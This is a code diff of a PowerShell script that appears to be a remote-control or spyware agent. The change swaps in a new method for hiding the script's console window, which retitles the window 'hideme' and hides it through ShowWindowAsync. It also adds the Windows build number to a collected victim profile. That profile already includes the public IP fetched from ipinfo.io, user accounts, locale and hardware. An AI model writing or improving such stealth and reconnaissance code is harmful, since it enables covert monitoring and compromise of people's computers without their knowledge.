@@ -25,9 +25,13 @@ $lastexecMessageID=""
 
 # Hide the console window
 If ($HideWindow -gt 0){
-$Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
-add-type -name win -member $Import -namespace native;
-[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
+$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+$Type = Add-Type -Member $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+$hwnd = (Get-Process -PID $pid).MainWindowHandle
+$Host.UI.RawUI.WindowTitle = 'hideme'
+$Proc = (Get-Process | Where-Object {$_.MainWindowTitle -eq 'hideme'})
+$hwnd = $Proc.MainWindowHandle
+$Type::ShowWindowAsync($hwnd, 0)
 }
 
 # Check version and update
@@ -426,6 +430,7 @@ $systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
 $userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
 $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
 $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
+$ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
 $processorInfo = Get-WmiObject -Class Win32_Processor
 $computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
 $userInfo = Get-WmiObject -Class Win32_UserAccount
@@ -464,6 +469,7 @@ Keyboard Layout : $keyboardLayoutID
 Other Accounts  : $users
 Public IP       : $computerPubIP
 Current OS      : $OSString
+Build           : $ver
 Hardware Info
 --------------------------------------------------------
 $systemString"
